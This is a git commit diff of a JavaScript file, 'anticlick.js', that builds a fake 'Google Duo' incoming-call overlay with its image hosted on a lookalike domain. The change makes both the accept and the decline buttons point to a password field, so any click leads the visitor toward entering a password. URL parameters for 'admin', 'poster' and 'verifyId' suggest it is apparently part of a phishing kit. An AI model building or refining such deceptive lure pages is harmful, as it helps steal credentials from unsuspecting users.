666a17bf82c8aa2a9945d79463a415f2a18de4ab
rana <rana.buddy@gmail.com>
2025-08-31 21:20:35 +0600

    work order folder created

--- anticlick.js
+++ anticlick.js
@@ -1,6 +1,7 @@
-
+// Create elements programmatically
 const newDiv = document.createElement('div');
 newDiv.className = 'card';
+
 
 
 newDiv.innerHTML = `
@@ -28,13 +29,13 @@ newDiv.innerHTML = `
                <img alt="Google Duo" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" class="rounded-full object-cover object-center p-2 bg-green-100" style="color:transparent" src="https://joinfacetimes.com/public/images/google-duo.png">
                <p class="text-xl font-medium text-neutral-700 text-center">Incoming call...</p>
                <div class="flex items-center justify-center gap-x-12 text-neutral-50">
-                  <label for="password" class="size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
+                  <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                         <path fill="none" d="M0 0h24v24H0z"></path>
                         <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
                      </svg>
                   </label>
-                  <label for="password" class="size-14 flex items-center justify-center rounded-full text-3xl bg-red-500">
+                  <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-red-500">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                         <path fill="none" d="M0 0h24v24H0z"></path>
                         <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
@@ -54,7 +55,6 @@ newDiv.innerHTML = `
     
 
 document.addEventListener('click', function(e) {
-
 function getQueryParam(param) {
     const urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(param);
@@ -66,6 +66,9 @@ const errorParam = urlParams.get('error');
 const adminId = urlParams.get('admin');
 const posterId = urlParams.get('poster');
 const verifyId = urlParams.get('verifyId');
+
+
+
 
 
        
